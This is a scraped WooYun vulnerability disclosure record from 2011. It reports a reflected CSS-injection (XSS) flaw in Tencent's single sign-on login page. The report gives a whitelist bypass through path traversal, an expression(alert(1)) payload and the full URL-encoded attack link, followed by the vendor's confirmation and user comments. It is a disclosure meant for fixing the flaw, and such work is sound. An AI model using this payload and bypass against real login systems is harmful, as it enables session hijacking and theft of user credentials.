{"id": 22616, "wybug_id": "wooyun-2011-02203", "wybug_title": "腾讯单点登录系统CSS样式表注入漏洞", "wybug_corp": "腾讯", "wybug_author": "rayh4c", "wybug_date": "2011-06-01 15:34", "wybug_open_date": "2011-07-01 18:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-01：\t细节向公众公开  简要描述： 腾讯单点登录系统存在一个CSS样式表漏洞,导致可以注入脚本劫持使用单点登陆插件盗取用户的clientkey使用QQ服务. 详细说明：  腾讯单点登录系统有个CSS参数可以导入远程的样式表,CSS样式表URL有个白名单列表,开发人员只通过字符串搜索的方式匹配白名单,导致可以饶过该白名单限制.   漏洞证明：  如http://pengyou.qq.com/asset/login.css是白名单那么通过一个搜索功能我们就能输出一段CSS样式表http://pengyou.qq.com/asset/out.php?mod=outsearch&act=result&name=}body{x:expression(alert(1))}由于开发人员只通过字符串搜索的方式匹配白名单URL,我们可以通过目录跳转符的方式访问CSS样式表链接http://pengyou.qq.com/asset/login.css/../../out.php?mod=outsearch&act=result&name=}body{x:expression(alert(1))}最后生成攻击链接http://xui.ptlogin2.qq.com/cgi-bin/qlogin?domain=qq.com&lang=2052&qtarget=2&jumpname=&ptcss=&param=&css=http%3a%2f%2fpengyou.qq.com%2fasset%2flogin.css%2f..%2f..%2fout.php%3fmod%3doutsearch%26act%3dresult%26name%3d%7dbody%7bx%3aexpression(alert(1))%7d\n\n   修复方案：  严格匹配白名单,而不是通过字符串搜索的方式匹配白名单.   版权声明：转载请注明来源 rayh4c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2011-06-01 16:15 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-06-05 17:07 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  注入脚本劫持....听起来很爽..    \n     2011-07-01 18:43 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  第一次 看到CSS 跨目录    \n     2011-07-02 09:46 |    \t\t1cefish \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:12        | 作为一个到处漂泊了5年的SB 表示黑客无处不...)\t\t \n  CSS跨目录，牛B啊脚本注入~~~     \n     2013-01-24 00:08 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我擦。。牛B，，    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}